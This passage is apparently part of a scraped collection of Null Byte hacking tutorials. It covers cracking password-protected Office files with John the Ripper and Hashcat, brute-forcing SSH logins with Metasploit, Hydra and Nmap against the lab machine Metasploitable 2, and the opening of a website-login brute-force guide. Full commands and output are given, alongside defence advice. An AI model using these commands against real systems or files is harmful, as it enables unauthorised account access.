hash.txt\ndummy.docx:$office$*2007*20*128*16*a7c7a4eadc2d90fb22c073c6324b6b49*abc5f80409f5f96f97e184e44aacd0b7*930b0c48a7eb5e13a57af4f3030b48e9402b6870\nStep 4: Crack the Hash You Just Saved\nLike already mentioned, we'll be showing you two ways to crack the hash you just saved from the password-protected Microsoft Office file. Both methods work great, so it's really up to preference.\nOption 1: Cracking with John\nSet the --wordlist flag with the location of your favorite word list. The one that is included with Nmap will do for our purposes here, but for tougher passwords, you may want to go with a more extensive word list.\n~# john --wordlist=/usr/share/wordlists/nmap.lst hash.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES])\nCost 1 (MS Office version) is 2007 for all loaded hashes\nCost 2 (iteration count) is 50000 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nJohn will start cracking, and depending on the password complexity, will finish when a match is found. Press almost any key to view the current status. When the hash is cracked, a message will be displayed on-screen with the document's password: Since our password was pretty simple, it only took seconds to crack it.\npassword123      (dummy.docx)\n1g 0:00:00:03 DONE (2019-02-05 15:00) 0.2824g/s 415.8p/s 415.8c/s 415.8C/s lacoste..cooldude\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\nWe can also use the --show option to display it, like so:\n~# john --show hash.txt\ndummy.docx:password123\n1 password hash cracked, 0 left\nNow that we know one method of cracking a password-protected Microsoft Office file, let's look at one other way using the powerful tool Hashcat.\nOption 2: Cracking with Hashcat\nWe can begin by displaying the help menu (--help) for Hashcat. This will provide us with a wealth of information including usage options, hash modes, and other features. There is a ton of information here, so I won't show the output, but you should dive into it if you really want to know Hashcat.\n~# hashcat --help\nFrom the output, we're just interested in the MS Office hash modes. Near the bottom of the help menu, we will find the MS Office mode options and their corresponding numbers. We know from our hash that this is an Office 2007 file, so locate its number ID of 9400.\n9700 | MS Office <= 2003 $0/$1, MD5 + RC4               | Documents\n9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1  | Documents\n9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2  | Documents\n9800 | MS Office <= 2003 $3/$4, SHA1 + RC4              | Documents\n9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1    | Documents\n9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2    | Documents\n9400 | MS Office 2007                                   | Documents\n9500 | MS Office 2010                                   | Documents\n9600 | MS Office 2013                                   | Documents\nNow we can set the rest of our options using the following command.\n~# hashcat -a 0 -m 9400 --username -o cracked_pass.txt hash.txt /usr/share/wordlists/nmap.lst\n* The -a flag sets the attack type as the default straight mode of 0.\n* The -m flag specifies the mode we want to use, which we just found.\n* The --username option ignores any usernames in the hash file.\n* We can specify the output file as cracked.txt with the -o flag.\n* And finally, we can pass in hash.txt which contains the hash, and set a word list just like we did earlier.\nHashcat will then begin cracking.\nhashcat (v5.1.0) starting...\n* Device #2: Not a native Intel OpenCL runtime. Expect massive speed loss.\nYou can use --force to override, but do not report related errors.\nOpenCL Platform #1: Intel(R) Corporation\n========================================\n* Device #1: Intel(R) Core(TM) i5 CPU       M 480  @ 2.67GHz, 934/3736 MB allocatable, 4MCU\nAfter some time has passed, the status will show as cracked, and we are ready to view the password.\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: MS Office 2007\nHash.Target......: $office$*2007*20*128*16*a7c7a4eadc2d90fb22c073c6324...2b6870\nTime.Started.....: Tue Feb  5 15:08:00 2019 (4 secs)\nTime.Estimated...: Tue Feb  5 15:08:04 2019 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/nmap.lst)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:      610 H/s (8.51ms) @ Accel:512 Loops:128 Thr:1 Vec:4\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 2048/5084 (40.28%)\nRejected.........: 0/2048 (0.00%)\nRestore.Point....: 0/5084 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:49920-50000\nCandidates.#1....: #!comment:  ***********************IMPORTANT NMAP LICENSE TERMS************************ -> Princess\nStarted: Tue Feb  5 15:07:50 2019\nStopped: Tue Feb  5 15:08:05 2019\nSimply cat out the specified output file, and it will show the hash with the plaintext password tacked on the end.\n~# cat cracked_pass.txt\n$office$*2007*20*128*16*a7c7a4eadc2d90fb22c073c6324b6b49*abc5f80409f5f96f97e184e44aacd0b7*930b0c48a7eb5e13a57af4f3030b48e9402b6870:password123\nSuccess! Now we know two methods of cracking the hash after extracting it from a password-protected Microsoft Office file with office2john.\nHow to Defend Against Cracking\nWhen it comes to password cracking of any kind, the best defense technique is to use password best practices. This means using unique passwords that are long and not easily guessable. It helps to utilize a combination of upper and lowercase letters, numbers, and symbols, although recent research has shown that simply using long phrases with high entropy is superior. Even better are long, randomly generated passwords which makes cracking them nearly impossible.\nIn regards to this specific attack, using Microsoft Office 2016 or 2019 documents or newer may not be effective, since office2john is designed to work on earlier versions of Office. However, as you can see above, Office 2016 may very well spit out a 2013 document without the user even knowing, so it doesn't mean a \"new\" file can't be cracked. Plus, there are still plenty of older Microsoft Office documents floating around out there, and some organizations continue to use these older versions, making this attack still very feasible today.\nWrapping Up\nToday, we learned that password-protected Microsoft Office files are not quite as secure as one would be led to believe. We used a tool called office2john to extract the hash of a DOCX file, and then cracked that hash using John the Ripper and Hashcat. These types of files are still commonly used today, so if you come across one that has a password on it, rest easy knowing that there is a way to crack it.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by efes/Pixabay",
        "category": "Password Cracking"
    },
    {
        "title": "Gain SSH Access to Servers by Brute-Forcing Credentials",
        "link": "https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/",
        "content": "* WonderHowTo\nSSH is one of the most common protocols in use in modern IT infrastructures, and because of this, it can be a valuable attack vector for hackers. One of the most reliable ways to gain SSH access to servers is by brute-forcing credentials. There are a few methods of performing an SSH brute-force attack that will ultimately lead to the discovery of valid login credentials.\nWhile not the only ways to do so, we'll be exploring tools such as Metasploit, Hydra, and the Nmap Scripting Engine in Nmap to accomplish this task, all of which are included in Kali Linux. As for the target, we will be practicing on Metasploitable 2, a purposely vulnerable test environment for pentesting and security research.\nOverview of SSH\nSSH, which stands for Secure Shell, is a network protocol that allows for encrypted communication over an insecure network. This was developed as an alternative to Telnet, which sends information in plaintext, which is clearly a problem, especially when passwords are involved.\nThe SSH cryptographic network protocol operates on a client-server model. That is, the client initiates a connection to the server, and communication is established after authentication takes place. SSH can use both password and private key authentication, the latter of which is considered more secure.\nRecommended Reading Material: SSH, The Secure Shell: The Definitive Guide\nUses for SSH include providing a means for remote logins and command execution, file transfer, mobile development, and connectivity troubleshooting in cloud-based applications. Virtually every large enterprise implements SSH in one way or another, making it a valuable technology to become acquainted with.\nScan with Nmap\nBefore we begin any brute-force attacks, we need to determine the state of the port that SSH is running on. We can perform a simple Nmap scan to see if it is open or not. Instead of scanning all the default ports, we can specify a single port number with the -p flag.\n~$ nmap 172.16.1.102 -p 22\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-08-09 14:58 CST\nNmap scan report for 172.16.1.102\nHost is up (0.0039s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\nMAC Address: 08:00:27:77:62:6C (Oracle VirtualBox virtual NIC)\nNmap done: 1 IP address (1 host up) scanned in 13.33 seconds\nAbove, we can see that port 22 is open and the SSH service is running on it. It would be a waste of time if this was closed or not running at all. Now we can start brute-forcing.\nMethod 1: Metasploit\nThe first method we will try out today involves one of Metasploit's auxiliary scanners. First, start the PostgreSQL database with the following command.\n~$ sudo service postgresql start\nNow, we can fire up Metasploit by typing msfconsole in the terminal.\n~$ msfconsole\n____________\n< metasploit >\n------------\n\\  (oo)____\n=[ metasploit v5.0.87-dev                          ]\n+ -- --=[ 2006 exploits - 1096 auxiliary - 343 post       ]\n+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 7 evasion                                       ]\nMetasploit tip: Use help <command> to learn more about any command\nYou should see \"msf\" appear, though, for me, it's \"msf5\" since I'm using the most recent version, Metasploit 5, which can be upgraded by running the latest version of Kali. It's always a good idea to stay updated in order to take advantage of the latest exploits and tools. Here is the command I use to update:\n~$ sudo apt update && sudo apt dist-upgrade\nNext, after being greeted by the welcome banner for msfconsole, we can find the appropriate module with the search command.\nmsf5 > search ssh\nMatching Modules\n================\n#   Name                                                        Disclosure Date  Rank       Check  Description\n-   ----                                                        ---------------  ----       -----  -----------\n0   auxiliary/dos/windows/ssh/sysax_sshd_kexchange              2013-03-17       normal     No     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service\n1   auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                    normal     No     SSH Key Exchange Init Corruption\n2   auxiliary/fuzzers/ssh/ssh_version_15                                         normal     No     SSH 1.5 Version Fuzzer\n3   auxiliary/fuzzers/ssh/ssh_version_2                                          normal     No     SSH 2.0 Version Fuzzer\n4   auxiliary/fuzzers/ssh/ssh_version_corrupt                                    normal     No     SSH Version Corruption\n5   auxiliary/scanner/http/cisco_firepower_login                                 normal     No     Cisco Firepower Management Console 6.0 Login\n6   auxiliary/scanner/http/gitlab_user_enum                     2014-11-21       normal     No     GitLab User Enumeration\n7   auxiliary/scanner/ssh/apache_karaf_command_execution        2016-02-09       normal     No     Apache Karaf Default Credentials Command Execution\n8   auxiliary/scanner/ssh/cerberus_sftp_enumusers               2014-05-27       normal     No     Cerberus FTP Server SFTP Username Enumeration\n9   auxiliary/scanner/ssh/detect_kippo                                           normal     No     Kippo SSH Honeypot Detector\n10  auxiliary/scanner/ssh/eaton_xpert_backdoor                  2018-07-18       normal     No     Eaton Xpert Meter SSH Private Key Exposure Scanner\n11  auxiliary/scanner/ssh/fortinet_backdoor                     2016-01-09       normal     No     Fortinet SSH Backdoor Scanner\n12  auxiliary/scanner/ssh/juniper_backdoor                      2015-12-20       normal     No     Juniper SSH Backdoor Scanner\n13  auxiliary/scanner/ssh/karaf_login                                            normal     No     Apache Karaf Login Utility\n14  auxiliary/scanner/ssh/libssh_auth_bypass                    2018-10-16       normal     No     libssh Authentication Bypass Scanner\n15  auxiliary/scanner/ssh/ssh_enum_git_keys                                      normal     No     Test SSH Github Access\n16  auxiliary/scanner/ssh/ssh_enumusers                                          normal     No     SSH Username Enumeration\n17  auxiliary/scanner/ssh/ssh_identify_pubkeys                                   normal     No     SSH Public Key Acceptance Scanner\n18  auxiliary/scanner/ssh/ssh_login                                              normal     No     SSH Login Check Scanner\n19  auxiliary/scanner/ssh/ssh_login_pubkey                                       normal     No     SSH Public Key Login Scanner\n20  auxiliary/scanner/ssh/ssh_version                                            normal     No     SSH Version Scanner\n21  exploit/apple_ios/ssh/cydia_default_ssh                     2007-07-02       excellent  No     Apple iOS Default SSH Password Vulnerability\n22  exploit/linux/http/alienvault_exec                          2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution\n23  exploit/linux/http/php_imap_open_rce                        2018-10-23       good       Yes    php imap_open Remote Code Execution\n24  exploit/linux/http/symantec_messaging_gateway_exec          2017-04-26       excellent  No     Symantec Messaging Gateway Remote Code Execution\n25  exploit/linux/http/ubiquiti_airos_file_upload               2016-02-13       excellent  No     Ubiquiti airOS Arbitrary File Upload\n26  exploit/linux/local/ptrace_traceme_pkexec_helper            2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit\n27  exploit/linux/ssh/ceragon_fibeair_known_privkey             2015-04-01       excellent  No     Ceragon FibeAir IP-10 SSH Private Key Exposure\n28  exploit/linux/ssh/cisco_ucs_scpuser                         2019-08-21       excellent  No     Cisco UCS Director default scpuser password\n29  exploit/linux/ssh/exagrid_known_privkey                     2016-04-07       excellent  No     ExaGrid Known SSH Key and Default Password\n30  exploit/linux/ssh/f5_bigip_known_privkey                    2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure\n31  exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey  2014-03-17       excellent  No     Loadbalancer.org Enterprise VA SSH Private Key Exposure\n32  exploit/linux/ssh/mercurial_ssh_exec                        2017-04-18       excellent  No     Mercurial Custom hg-ssh Wrapper Remote Code Exec\n33  exploit/linux/ssh/quantum_dxi_known_privkey                 2014-03-17       excellent  No     Quantum DXi V1000 SSH Private Key Exposure\n34  exploit/linux/ssh/quantum_vmpro_backdoor                    2014-03-17       excellent  No     Quantum vmPRO Backdoor Command\n35  exploit/linux/ssh/solarwinds_lem_exec                       2017-03-17       excellent  No     SolarWinds LEM Default SSH Password Remote Code Execution\n36  exploit/linux/ssh/symantec_smg_ssh                          2012-08-27       excellent  No     Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability\n37  exploit/linux/ssh/vmware_vdp_known_privkey                  2016-12-20       excellent  No     VMware VDP Known SSH Key\n38  exploit/multi/http/git_submodule_command_exec               2017-08-10       excellent  No     Malicious Git HTTP Server For CVE-2017-1000117\n39  exploit/multi/http/gitlab_shell_exec                        2013-11-04       excellent  Yes    Gitlab-shell Code Execution\n40  exploit/multi/ssh/sshexec                                   1999-01-01       manual     No     SSH User Code Execution\n41  exploit/unix/http/schneider_electric_net55xx_encoder        2019-01-25       excellent  Yes    Schneider Electric Pelco Endura NET55XX Encoder\n42  exploit/unix/ssh/array_vxag_vapv_privkey_privesc            2014-02-03       excellent  No     Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution\n43  exploit/unix/ssh/tectia_passwd_changereq                    2012-12-01       excellent  Yes    Tectia SSH USERAUTH Change Request Password Reset Vulnerability\n44  exploit/windows/local/unquoted_service_path                 2001-10-25       excellent  Yes    Windows Unquoted Service Path Privilege Escalation\n45  exploit/windows/ssh/freeftpd_key_exchange                   2006-05-12       average    No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow\n46  exploit/windows/ssh/freesshd_authbypass                     2010-08-11       excellent  Yes    Freesshd Authentication Bypass\n47  exploit/windows/ssh/freesshd_key_exchange                   2006-05-12       average    No     FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow\n48  exploit/windows/ssh/putty_msg_debug                         2002-12-16       normal     No     PuTTY Buffer Overflow\n49  exploit/windows/ssh/securecrt_ssh1                          2002-07-23       average    No     SecureCRT SSH1 Buffer Overflow\n50  exploit/windows/ssh/sysax_ssh_username                      2012-02-27       normal     Yes    Sysax 5.53 SSH Username Buffer Overflow\n51  payload/cmd/unix/reverse_ssh                                                 normal     No     Unix Command Shell, Reverse TCP SSH\n52  post/linux/gather/enum_network                                               normal     No     Linux Gather Network Information\n53  post/linux/manage/sshkey_persistence                                         excellent  No     SSH Key Persistence\n54  post/multi/gather/jenkins_gather                                             normal     No     Jenkins Credential Collector\n55  post/multi/gather/ssh_creds                                                  normal     No     Multi Gather OpenSSH PKI Credentials Collection\n56  post/windows/gather/credentials/mremote                                      normal     No     Windows Gather mRemote Saved Password Extraction\n57  post/windows/gather/enum_putty_saved_sessions                                normal     No     PuTTY Saved Sessions Enumeration Module\n58  post/windows/manage/forward_pageant                                          normal     No     Forward SSH Agent Requests To Remote Pageant\n59  post/windows/manage/install_ssh                                              normal     No     Install OpenSSH for Windows\n60  post/windows/manage/sshkey_persistence                                       good       No     SSH Key Persistence\nThe ssh_login module is exactly what we need. Equip it with the use command. Afterward, you should \"msf5 auxiliary(scanner/ssh/ssh_login), so you know you're working inside the right place.\nmsf5 > use auxiliary/scanner/ssh/ssh_login\nThen we can type options to display the available settings for the scanner.\nmsf5 auxiliary(scanner/ssh/ssh_login) > options\nModule options (auxiliary/scanner/ssh/ssh_login):\nName              Current Setting  Required  Description\n----              ---------------  --------  -----------\nBLANK_PASSWORDS   false            no        Try blank passwords for all users\nBRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5\nDB_ALL_CREDS      false            no        Try each user/password couple stored in the current database\nDB_ALL_PASS       false            no        Add all passwords in the current database to the list\nDB_ALL_USERS      false            no        Add all users in the current database to the list\nPASSWORD                           no        A specific password to authenticate with\nPASS_FILE                          no        File containing passwords, one per line\nRHOSTS                             yes       The target address range or CIDR identifier\nRPORT             22               yes       The target port\nSTOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host\nTHREADS           1                yes       The number of concurrent threads\nUSERNAME                           no        A specific username to authenticate as\nUSERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line\nUSER_AS_PASS      false            no        Try the username as the password for all users\nUSER_FILE                          no        File containing usernames, one per line\nVERBOSE           false            yes       Whether to print output for all attempts\nWe need to set a few things in order for this to work properly. First, RHOSTS is the IP address of our target.\nmsf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 172.16.1.102\nrhosts => 172.16.1.102\nNext, STOP_ON_SUCCESS will stop after finding valid credentials.\nmsf5 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true\nstop_on_success => true\nThen, USER_FILE is a list of usernames.\nmsf5 auxiliary(scanner/ssh/ssh_login) > set user_file users.txt\nuser_file => users.txt\nAnd PASS_FILE is a list of passwords.\nmsf5 auxiliary(scanner/ssh/ssh_login) > set pass_file passwords.txt\npass_file => passwords.txt\nFinally, there's VERBOSE, which will display all attempts.\nmsf5 auxiliary(scanner/ssh/ssh_login) > set verbose true\nverbose => true\nFor the user and password files, I used a shortened list containing known credentials for the purpose of this demonstration. In a real attack, you would likely want to use one of the well-known wordlists or a custom one to fit your needs.\nWe should be all set now. Type run at the prompt to kick it off:\nmsf5 auxiliary(scanner/ssh/ssh_login) > run\n[-] 172.16.1.102:22 - Failed: 'user:password'\n[-] 172.16.1.102:22 - Failed: 'user:Password123'\n[-] 172.16.1.102:22 - Failed: 'user:msfadmin'\n[-] 172.16.1.102:22 - Failed: 'user:admin'\n[-] 172.16.1.102:22 - Failed: 'user:default'\n[-] 172.16.1.102:22 - Failed: 'user:root'\n[-] 172.16.1.102:22 - Failed: 'user:toor'\n[-] 172.16.1.102:22 - Failed: 'user:hello'\n[-] 172.16.1.102:22 - Failed: 'user:welcome'\n[-] 172.16.1.102:22 - Failed: 'user:hunter2'\n[-] 172.16.1.102:22 - Failed: 'msfadmin:password'\n[-] 172.16.1.102:22 - Failed: 'msfadmin:Password123'\n[+] 172.16.1.102:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '\n[*] Command shell session 1 opened (172.16.1.100:37615 -> 172.16.1.102:22) at 2020-08-09 15:06:58 -0600\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nSince we set the verbose option, we can see all the attempts as they take place. Depending on the number of username and password combinations, this can take quite some time to run.\nWhen valid credentials are found, a success message is displayed and a command shell is opened. It does not automatically drop us in, though, so we can display the current active sessions with the sessions command.\nmsf5 auxiliary(scanner/ssh/ssh_login) > sessions\nActive sessions\n===============\nId  Name  Type         Information                              Connection\n--  ----  ----         -----------                              ----------\n1         shell linux  SSH msfadmin:msfadmin (172.16.1.102:22)  172.16.1.100:37615 -> 172.16.1.102:22 (172.16.1.102)\nThis says that it is an SSH connection. To interact with this session, use the -i flag.\nmsf5 auxiliary(scanner/ssh/ssh_login) > sessions -i 1\n[*] Starting interaction with 1...\nuid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)\nNow we are connected to the target via SSH and can run commands like normal.\nMethod 2: Hydra\nThe next tool we will use is Hydra, a powerful login cracker which is very fast and supports a number of different protocols. To show the help and some basic usage options, simply type hydra in the terminal. (Note, if you were previously in the msf console, make sure you cd out of it before using Hydra.)\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\nSyntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]\n-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE\n-p PASS  or -P FILE  try password PASS, or load several passwords from FILE\n-C FILE   colon separated \"login:pass\" format, instead of -L/-P options\n-M FILE   list of servers to attack, one entry per line, ':' to specify port\n-t TASKS  run TASKS number of connects in parallel per target (default: 16)\n-U        service module usage details\n-h        more command line options (COMPLETE HELP)\nserver    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)\nservice   the service to crack (see below for supported protocols)\nOPT       some service modules support additional input (-U for module help)\nSupported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp\nHydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL\nv3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra\nDon't use in military or secret service organizations, or for illegal purposes.\nExample:  hydra -l user -P passlist.txt ftp://192.168.0.1\nHydra contains a range of options, but today we will be using the following:\n* The -L flag, which specifies a list of login names.\n* The -P flag, which specifies a list of passwords.\n* ssh://172.16.1.102 — our target and protocol.\n* The -t flag set to 4, which sets the number of parallel tasks to run.\nOnce we kick it off, the tool will display the status of the attack:\n~$ hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-09 15:12:47\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 90 login tries (l:9/p:10), ~23 tries per task\n[DATA] attacking ssh://172.16.1.102:22/\nAfter a period of time, it will complete and show us the number of successful logins found.\n[22][ssh] host: 172.16.1.102   login: msfadmin   password: msfadmin\n[STATUS] 44.00 tries/min, 44 tries in 00:01h, 46 to do in 00:02h, 4 active\n[STATUS] 42.00 tries/min, 84 tries in 00:02h, 6 to do in 00:01h, 4 active\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-09 15:15:10\nHydra's parallel processing power makes it a good choice when a large number of potential credentials are involved.\nMethod 3: Nmap Scripting Engine\nThe last method of brute forcing SSH credentials we will try out today involves the use of the Nmap Scripting Engine. NSE contains a script which will attempt to brute-force all possible combinations of a username and password pair. To perform this attack, we can run a simple Nmap scan from a fresh terminal just like before, but with a few extra options tacked on:\n* --script ssh-brute specifies the script to use.\n* --script-args will set the arguments for the script, separated by a comma.\n* userdb=users.txt is the list of usernames we wish to use.\n* passdb=passwords.txt is the list of passwords we wish to use.\nNow, we are ready to start the scan:\n~$ nmap 172.16.1.102 -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-08-09 15:17 CST\nNSE will display the brute-force attempts and which credentials are being tried. Be patient — depending on the number of usernames and passwords being used, this can take some time.\nNSE: [ssh-brute] Trying username/password pair: user:user\nNSE: [ssh-brute] Trying username/password pair: msfadmin:msfadmin\nNSE: [ssh-brute] Trying username/password pair: admin:admin\nNSE: [ssh-brute] Trying username/password pair: root:root\nNSE: [ssh-brute] Trying username/password pair: john:john\nNSE: [ssh-brute] Trying username/password pair: default:default\nNSE: [ssh-brute] Trying username/password pair: support:support\nNSE: [ssh-brute] Trying username/password pair: service:service\nNSE: [ssh-brute] Trying username/password pair: adam:adam\nNSE: [ssh-brute] Trying username/password pair: admin:password\nNSE: [ssh-brute] Trying username/password pair: root:password\nNSE: [ssh-brute] Trying username/password pair: john:password\nNSE: [ssh-brute] Trying username/password pair: default:password\nNSE: [ssh-brute] Trying username/password pair: support:password\nNSE: [ssh-brute] Trying username/password pair: adam:password\nNSE: [ssh-brute] Trying username/password pair: admin:Password123\nNSE: [ssh-brute] Trying username/password pair: root:Password123\nNSE: [ssh-brute] Trying username/password pair: john:Password123\nNSE: [ssh-brute] Trying username/password pair: default:Password123\nAfter a while, the scan will finish and a report will be shown in the terminal.\nNmap scan report for 172.16.1.102\nHost is up (0.0011s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n| ssh-brute:\n|   Accounts:\n|     user:user - Valid credentials\n|     msfadmin:msfadmin - Valid credentials\n|     service:service - Valid credentials\n|_  Statistics: Performed 66 guesses in 124 seconds, average tps: 0.5\nMAC Address: 08:00:27:77:62:6C (Oracle VirtualBox virtual NIC)\nNmap done: 1 IP address (1 host up) scanned in 147.59 seconds\nAbove, we can see it discovered three valid login credentials. This script is useful because it will iterate through all possible pairs of usernames and passwords, which will sometimes yield more results.\nHow to Prevent SSH Brute-Forcing\nThe reality is that if you have a server facing the internet, there are going to be loads of SSH brute-force attempts daily, many of which are automated. But don't fret, there are some simple solutions to help protect against this and cut down on the number of login attempts.\nPerhaps one of the easiest things to do is change the port number which SSH operates on. Although this will dissuade the most rudimentary brute-force attempts, it is trivial to scan for SSH running on alternate ports.\nA better method is to implement a service like Fail2ban, DenyHosts, or iptables to block brute-force attempts at the host level. This, combined with using private key authentication instead of passwords, will put you out of the reach of most attackers. If password-based authentication is absolutely necessary, use strong passwords and follow best practices.\nWrapping Up\nIn this guide, we learned about SSH and how to brute-force credentials to gain access to a target. First, we covered how to identify open ports running SSH. Then we learned how to mount a brute-force attack using three methods: Metasploit, Hydra, and the Nmap Scripting Engine. Finally, we went over some ways to protect against these types of attacks.\nSSH is a prevalent protocol, so every hacker must know how to attack it — and how to prevent those attacks.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Skitterphoto/Pexels; Screenshots by drd_/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Brute-Force Nearly Any Website Login with Hatch",
        "link": "https://null-byte.wonderhowto.com/how-to/brute-force-nearly-any-website-login-with-hatch-0192225/",
        "content": "* WonderHowTo\nThe tactic of brute-forcing a login, i.e., trying many passwords very quickly until the correct one is discovered, can be easy for services like SSH or Telnet. For something like a website login page, we must identify different elements of the page first. Thanks to a Python tool for brute-forcing websites called Hatch, this process has been simplified to the point that even a beginner can try it.\nHow Brute-Force Attacks Work\nBrute-force attacks take advantage of automation to try many more passwords than a human could, breaking into a system through trial and error. More targeted brute-force attacks use a list of common passwords to speed this up, called dictionary attacks, and using this technique to check for weak passwords is often the first attack a hacker will try against a system.\nIn a brute-forcing attack against a service like SSH, it can be done from the command line easily by tools like Sshtrix. In a single line in a terminal, it's easy to launch a dictionary attack against a discovered SSH server using the built-in password list, making services with bad passwords extremely likely to be broken in to.\n* Don't Miss: Use Beginner Python to Build a Brute-Force Tool for SHA-1 Hashes\nThe biggest downside to a dictionary attack is that if the password does not exist in the password list, the attack will fail. If the password used on a targeted is strong, brute-force attacks can quickly become too expensive in time and resources to use as we start having to try every possible combination of characters. Another downside is that many services now do some fashion of rate-limiting, which detects too many failed login attempts and blocks further attempts for a period, which can substantially slow down a brute-force attack.\nWhy Brute-Force Attacks Are Harder on Websites\nWhile it's easy to attack a service that takes a username and password over the command line, there is a lot more going on in the code of a website. To design this attack, we need to think about what the script needs to know to do its job.\nWe want the script to find the correct password associated with a particular account by entering a guess into the fields of the login page and submitting it until we get a successful result. To do so, we must interact with the graphical user interface of the login page to input the information into the correct fields of both the login and password fields.\nAfter we do this, we need to submit the guess by clicking on the \"Login\" button on the page. Finally, we need the script to know the difference between a failure and a success, so that we can stop the script and identify the correct password guess.\nAll of this is a lot more work and quite confusing for beginners, but after doing so, automating brute-force attacks against the login page of most websites can be done similar to brute-forcing an SSH service.\nHatch for Brute-Forcing Web Logins\nPython is an ideal language for automating these kinds of attacks, and Hatch uses Python2 to automate the Chrome web browser to stage a dictionary attack against the login of any webpage with a visible login forum. While some websites with hidden login forums that require you to scroll or click to show can confuse the script, most sites are easy to target using this tool.\nUpon launching Hatch, the script opens a Chrome window for you to inspect the elements of the page you are targeting. After telling the script what site you want to brute-force a login to, it will check to see if the page exists and is accessible. If it is, Hatch will ask what login you want to brute-force, and then request a list of passwords to try during the attack.\nAfter Hatch has the information it needs, it will open a second Chrome window and begin automating the attack. You can sit back and watch the attack unfold either in the Chrome window or the terminal that is running the attack. In the terminal, you can watch each password attempt as the script progresses down the list. While this attack is powerful and useful against a wide range of targets, it can also be foiled by rate limiting and other methods of blocking excessive login attempts.\nWhat You'll Need\nWhile Hatch is cross-platform, it was a little complicated to set up on some systems. We ended up getting Hatch working on a Windows system with a few modifications to the script, which we've included here.\nTo follow this guide, you'll need a Windows system with Chrome and Python 2 installed. The current, modern version of Python is Python3, so you'll need to make sure that you're using the right version when you execute the script. If you run Hatch with Python3, it won't work correctly.\nYou'll also need to install a few dependencies, including a driver, to be able to interact with Chrome programmatically.\nStep 1: Check Your Version of Python\nFirst, we'll need to install a few dependencies. To take care of these, press the Windows key or click the Start menu, then type cmd. After opening a command prompt, make sure you have Python2 installed correctly by typing python2 into the terminal window. 